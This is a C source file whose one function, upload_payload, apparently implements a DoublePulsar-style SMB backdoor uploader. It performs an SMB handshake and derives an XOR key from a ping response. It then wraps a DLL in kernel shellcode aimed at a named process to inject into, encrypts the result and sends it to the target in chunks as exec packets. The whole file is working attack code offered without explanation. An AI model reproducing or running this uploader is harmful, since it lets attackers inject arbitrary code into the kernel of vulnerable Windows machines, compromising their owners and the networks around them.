#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        received += (size_t)result;
    }

    return 0;
}

static int upload_read_response(SOCKET sock, uint8_t **response, size_t *response_size)
{
    uint8_t header[4];
    uint32_t body_size;
    uint8_t *packet;

    *response = NULL;
    *response_size = 0;

    for (;;) {
        if (upload_recv_all(sock, header, sizeof(header)) != 0) {
            return -1;
        }

        body_size = ((uint32_t)header[1] << 16) |
                    ((uint32_t)header[2] << 8) |
                    (uint32_t)header[3];

        if (header[0] == 0x85 || body_size == 0) {
            continue;
        }

        packet = (uint8_t *)malloc((size_t)body_size + sizeof(header));
        if (packet == NULL) {
            return -1;
        }

        memcpy(packet, header, sizeof(header));
        if (upload_recv_all(sock, packet + sizeof(header), body_size) != 0) {
            free(packet);
            return -1;
        }

        *response = packet;
        *response_size = (size_t)body_size + sizeof(header);
        return 0;
    }
}

static void upload_store_le32(uint8_t *destination, uint32_t value)
{
    destination[0] = (uint8_t)value;
    destination[1] = (uint8_t)(value >> 8);
    destination[2] = (uint8_t)(value >> 16);
    destination[3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    uint8_t *dll_data = NULL;
    uint8_t *payload = NULL;
    uint8_t *packet = NULL;
    uint8_t *response = NULL;
    size_t response_size = 0;
    LARGE_INTEGER file_size;
    uint32_t dll_size;
    uint32_t payload_size;
    uint32_t shellcode_size;
    uint32_t key;
    uint32_t signature;
    uint32_t hash = 0;
    uint32_t offset;
    uint32_t chunk_size;
    size_t i;
    size_t process_name_length;
    DWORD bytes_read;
    uint64_t file_position;
    uint16_t user_id;
    uint16_t tree_id;
    struct sockaddr_in address;
    int wsa_started = 0;
    int result = -1;
    uint8_t *negotiate_packet = NULL;
    uint8_t *session_packet = NULL;
    uint8_t *tree_packet = NULL;
    uint8_t *ping_packet = NULL;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535) {
        return -1;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        goto cleanup;
    }
    wsa_started = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        goto cleanup;
    }

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        goto cleanup;
    }

    if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR) {
        goto cleanup;
    }

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE || !GetFileSizeEx(file, &file_size) ||
        file_size.QuadPart < 0 || (uint64_t)file_size.QuadPart > UINT32_MAX) {
        goto cleanup;
    }
    dll_size = (uint32_t)file_size.QuadPart;

    dll_data = dll_size != 0 ? (uint8_t *)malloc(dll_size) : NULL;
    if (dll_size != 0 && dll_data == NULL) {
        goto cleanup;
    }

    file_position = 0;
    while (file_position < dll_size) {
        uint64_t remaining = (uint64_t)dll_size - file_position;
        DWORD request = remaining > MAXDWORD ? MAXDWORD : (DWORD)remaining;
        if (!ReadFile(file, dll_data + (size_t)file_position, request, &bytes_read, NULL) ||
            bytes_read == 0) {
            goto cleanup;
        }
        file_position += bytes_read;
    }

    if (!CloseHandle(file)) {
        file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file = INVALID_HANDLE_VALUE;

    if (sizeof(SMB_NEGOTIATE_PKT) < 2 ||
        sizeof(SMB_SESSION_SETUP_PKT) < 2 ||
        sizeof(SMB_TREE_CONNECT_PKT) < 2 ||
        sizeof(DP_PING_PKT) < 2 ||
        sizeof(DP_EXEC_PKT) - 1 < SMB_EXEC_TEMPLATE_LEN ||
        KERNEL_RUNDLL_SIZE > UINT32_MAX ||
        KERNEL_RUNDLL_TOTAL_OFFSET > KERNEL_RUNDLL_SIZE ||
        KERNEL_RUNDLL_SIZE - KERNEL_RUNDLL_TOTAL_OFFSET < 4 ||
        KERNEL_RUNDLL_DLLSIZE_OFFSET > KERNEL_RUNDLL_SIZE ||
        KERNEL_RUNDLL_SIZE - KERNEL_RUNDLL_DLLSIZE_OFFSET < 4 ||
        KERNEL_RUNDLL_ORDINAL_OFFSET > KERNEL_RUNDLL_SIZE ||
        KERNEL_RUNDLL_SIZE - KERNEL_RUNDLL_ORDINAL_OFFSET < 4 ||
        KERNEL_RUNDLL_HASH_OFFSET > KERNEL_RUNDLL_SIZE ||
        KERNEL_RUNDLL_SIZE - KERNEL_RUNDLL_HASH_OFFSET < 4 ||
        dll_size > UINT32_MAX - 3978U ||
        dll_size > UINT32_MAX - (uint32_t)KERNEL_RUNDLL_SIZE) {
        goto cleanup;
    }

    shellcode_size = (uint32_t)KERNEL_RUNDLL_SIZE;
    payload_size = shellcode_size + dll_size;

    negotiate_packet = (uint8_t *)malloc(sizeof(SMB_NEGOTIATE_PKT) - 1);
    session_packet = (uint8_t *)malloc(sizeof(SMB_SESSION_SETUP_PKT) - 1);
    tree_packet = (uint8_t *)malloc(sizeof(SMB_TREE_CONNECT_PKT) - 1);
    ping_packet = (uint8_t *)malloc(sizeof(DP_PING_PKT) - 1);
    payload = (uint8_t *)malloc(payload_size);
    packet = (uint8_t *)malloc((size_t)SMB_EXEC_TEMPLATE_LEN + 12U +
                               SMB_EXEC_SHELLCODE_LEN);
    if (negotiate_packet == NULL || session_packet == NULL ||
        tree_packet == NULL || ping_packet == NULL || payload == NULL ||
        packet == NULL) {
        goto cleanup;
    }

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1);
    memcpy(session_packet, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1);
    memcpy(tree_packet, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT) - 1);
    memcpy(ping_packet, DP_PING_PKT, sizeof(DP_PING_PKT) - 1);

    if (upload_send_all(sock, negotiate_packet, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_read_response(sock, &response, &response_size) != 0) {
        goto cleanup;
    }
    free(response);
    response = NULL;

    if (upload_send_all(sock, session_packet, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_read_response(sock, &response, &response_size) != 0 ||
        response_size < 34) {
        goto cleanup;
    }
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    if (sizeof(SMB_TREE_CONNECT_PKT) - 1 <= 33) {
        goto cleanup;
    }
    tree_packet[32] = (uint8_t)user_id;
    tree_packet[33] = (uint8_t)(user_id >> 8);

    if (upload_send_all(sock, tree_packet, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        upload_read_response(sock, &response, &response_size) != 0 ||
        response_size < 30) {
        goto cleanup;
    }
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    if (sizeof(DP_PING_PKT) - 1 <= 33) {
        goto cleanup;
    }
    ping_packet[28] = (uint8_t)tree_id;
    ping_packet[29] = (uint8_t)(tree_id >> 8);
    ping_packet[32] = (uint8_t)user_id;
    ping_packet[33] = (uint8_t)(user_id >> 8);

    if (upload_send_all(sock, ping_packet, sizeof(DP_PING_PKT) - 1) != 0 ||
        upload_read_response(sock, &response, &response_size) != 0 ||
        response_size < (size_t)SMB_RESP_SIGNATURE_START + 4U) {
        goto cleanup;
    }

    signature = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    key = (2U * signature) ^
          ((((signature >> 16) | (signature & 0x00FF0000U)) >> 8) |
           (((signature << 16) | (signature & 0x0000FF00U)) << 8));
    free(response);
    response = NULL;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, shellcode_size);
    if (dll_size != 0) {
        memcpy(payload + shellcode_size, dll_data, dll_size);
    }

    upload_store_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET, dll_size + 3978U);
    upload_store_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, dll_size);
    upload_store_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1U);

    process_name_length = strlen(TARGET_INJECT_PROCESS);
    for (i = 0; i < process_name_length; ++i) {
        hash = hash * 127U + (uint8_t)TARGET_INJECT_PROCESS[i];
    }
    upload_store_le32(payload + KERNEL_RUNDLL_HASH_OFFSET, hash);

    for (i = 0; i < payload_size; ++i) {
        payload[i] ^= (uint8_t)(key >> ((i & 3U) * 8U));
    }

    offset = 0;
    while (offset < payload_size) {
        size_t fixed_size = (size_t)SMB_EXEC_TEMPLATE_LEN + 12U;
        size_t packet_size;
        uint32_t remaining = payload_size - offset;
        uint8_t *parameters;

        chunk_size = remaining > SMB_EXEC_SHELLCODE_LEN ?
                     SMB_EXEC_SHELLCODE_LEN : remaining;
        packet_size = fixed_size + chunk_size;

        memcpy(packet, DP_EXEC_PKT, SMB_EXEC_TEMPLATE_LEN);
        packet[SMB_TID_OFFSET] = (uint8_t)tree_id;
        packet[SMB_TID_OFFSET + 1] = (uint8_t)(tree_id >> 8);
        packet[SMB_UID_OFFSET] = (uint8_t)user_id;
        packet[SMB_UID_OFFSET + 1] = (uint8_t)(user_id >> 8);

        {
            uint32_t netbios_length = chunk_size + SMB_EXEC_TEMPLATE_LEN + 12U - 4U;
            packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;
        }

        packet[SMB_EXEC_TOTAL_DATA_OFFSET] = (uint8_t)chunk_size;
        packet[SMB_EXEC_TOTAL_DATA_OFFSET + 1] = (uint8_t)(chunk_size >> 8);
        packet[SMB_EXEC_DATA_COUNT_OFFSET] = (uint8_t)chunk_size;
        packet[SMB_EXEC_DATA_COUNT_OFFSET + 1] = (uint8_t)(chunk_size >> 8);

        {
            uint32_t byte_count = chunk_size + 12U;
            packet[SMB_EXEC_BYTE_COUNT_OFFSET] = (uint8_t)byte_count;
            packet[SMB_EXEC_BYTE_COUNT_OFFSET + 1] = (uint8_t)(byte_count >> 8);
        }

        parameters = packet + SMB_EXEC_TEMPLATE_LEN;
        upload_store_le32(parameters, payload_size ^ key);
        upload_store_le32(parameters + 4, chunk_size ^ key);
        upload_store_le32(parameters + 8, offset ^ key);
        memcpy(packet + fixed_size, payload + offset, chunk_size);

        if (upload_send_all(sock, packet, packet_size) != 0 ||
            upload_read_response(sock, &response, &response_size) != 0) {
            goto cleanup;
        }

        if (offset + chunk_size == payload_size) {
            if (response_size <= DP_RESP_MUX_ID_OFFSET ||
                response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
                goto cleanup;
            }
        }

        free(response);
        response = NULL;
        offset += chunk_size;
    }

    result = 0;

cleanup:
    if (response != NULL) {
        free(response);
    }
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if (wsa_started) {
        WSACleanup();
    }
    free(dll_data);
    free(payload);
    free(packet);
    free(negotiate_packet);
    free(session_packet);
    free(tree_packet);
    free(ping_packet);
    return result;
}